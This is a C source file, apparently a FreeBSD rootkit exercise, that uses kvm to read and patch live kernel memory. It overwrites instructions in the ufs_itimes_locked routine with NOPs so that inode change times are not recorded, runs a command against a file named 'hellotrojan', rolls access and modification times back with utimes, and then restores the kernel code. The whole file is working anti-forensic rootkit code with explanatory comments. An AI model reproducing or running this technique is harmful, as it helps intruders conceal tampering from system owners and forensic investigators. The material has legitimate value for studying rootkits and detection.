#include <errno.h>
#include <fcntl.h>
#include <kvm.h>
#include <limits.h>
#include <nlist.h>
#include <stdio.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <stdlib.h>

// OK this program operates in user land. 
// The file change, access, modification times will be a 
// giveaway that additions are being made to a file system.
// So this program has a two pronged approach: access and
// modification times are simply rolled back. 
// Change times are nullified by patching the kernel code 
// which updates the change times in the inode. 
// 
// Change times are different from modification times: 
// file modification times are updated when the file is modified.
// Change times are like an audit trail. It records the times of
// all changes to the file system. 
//
// Rolling back is simple: record time before, then do the change
// and then apply the time again.

// The SIZE is the value of the change time code.

#define SIZE 450 // Size of shell code?
#define T_NAME "hellotrojan"

unsigned char nop[] = "\x90\x90\x90";

int main(int argc, char ** argv) {

	int i, offset1, offset2; 
	char errbuf[_POSIX2_LINE_MAX];
	kvm_t *kd;

	struct nlist nl[] = { {NULL}, {NULL}, };
	unsigned char ufs_itimes_code[SIZE];

// The stat struct will hold the file stat which includes
// file modification times.

	struct stat sb;
	struct timeval time[2];

	kd = kvm_openfiles(NULL, NULL, NULL, O_RDWR, errbuf);

	if (kd == NULL) {
		fprintf(stderr, "ERROR: %s\n", errbuf);
		exit(-1);
	}

// ufs_itimes_locked is the kernel routine that does the time
// updation in the inode. 

	nl[0].n_name = "ufs_itimes_locked";

	if (kvm_nlist(kd, nl) < 0) {
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	if (!nl[0].n_value) {
		fprintf(stderr, "ERROR: Symbol %s not found \n", nl[0].n_name);
		exit(-1);
	}

	if (kvm_read(kd, nl[0].n_value, ufs_itimes_code, SIZE) < 0) {
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

// The ufs_itimes_locked code is sucked into the ufs_itimes_code
// array. Then we search for the byte code patterns that 
// surround the DIP_SET macro's third occurrence. That will
// help get the offsets for the two points where nop code
// needs to be inserted.

	for (i = 0; i < SIZE - 2; i++) {
		if (ufs_itimes_code[i] == 0x89 &&
			ufs_itimes_code[i+1] == 0x42 &&
				ufs_itimes_code[i+2] == 0x30) {
					offset1 = i;
		}

		if (ufs_itimes_code[i] == 0x89 &&
			ufs_itimes_code[i+1] == 0x4a &&
				ufs_itimes_code[i+2] == 0x34) {
					offset2 = i;
		}
	}

// Now we stat the folder and then the results are loaded into the
// sb struct.

	if (stat("/home/rootkit", &sb) < 0) {
		fprintf(stderr, "STAT ERROR: %d\n", errno);
		exit(-1);
	}

// The access time and modified time are extracted from the
// sb struct and placed into the time array.
// This is needed to rollback the access and modification
// times.

	time[0].tv_sec = sb.st_atime;
	time[1].tv_sec = sb.st_mtime;

// Now the kvm_write calls below will write the nop code
// to the two offset locations. 
// This will nullify the code that will update the 
// inode change times.

	if (kvm_write(kd, nl[0].n_value + offset1, nop, 
		sizeof(nop) - 1) < 0) {
			fprintf(stderr, "First ERROR: %s\n", kvm_geterr(kd));
			exit(-1);
	}

	if (kvm_write(kd, nl[0].n_value + offset2, nop, 
		sizeof(nop) - 1) < 0) {
			fprintf(stderr, "Second ERROR: %s\n", kvm_geterr(kd));
			exit(-1);
	}
// Now we do the thing in the folder which will cause the time updation.
// But since the code has been nullified the time will be unchanged.
// I have code in timecheck.c program which stats a file and gets
// the time and prints it. 
	char string[] = "ls ./" T_NAME;

	system(string);

	
// The utimes call will update the times from the time array. 
// This will effectively "roll back" the time.
// The change times are unaffected because we patched the
// ufs_itimes_locked code.

	if (utimes("/home/rootkit", (struct timeval *)&time) < 0) {
		fprintf(stderr, "UTIMES ERROR: %d\n", errno);
		exit(-1);
	}

// Now the kvm_write will write back the code snippet to the place
// in ufs_itimes_locked where the nop code was written. This 
// removes the patch. 

	if (kvm_write(kd, nl[0].n_value + offset1, &ufs_itimes_code[offset1],
		sizeof(nop) - 1) < 0) {
			fprintf(stderr, "Third ERROR %s\n", kvm_geterr(kd));
			exit(-1);
	}

	if (kvm_write(kd, nl[0].n_value + offset2, &ufs_itimes_code[offset2],
		sizeof(nop) - 1) < 0) {
			fprintf(stderr, "Fourth ERROR %s\n", kvm_geterr(kd));
			exit(-1);
	}


	if (kvm_close(kd) < 0 ) {
		fprintf(stderr, "ERROR: %s\n", kvm_geterr(kd));
		exit(-1);
	}

	exit(0);
}



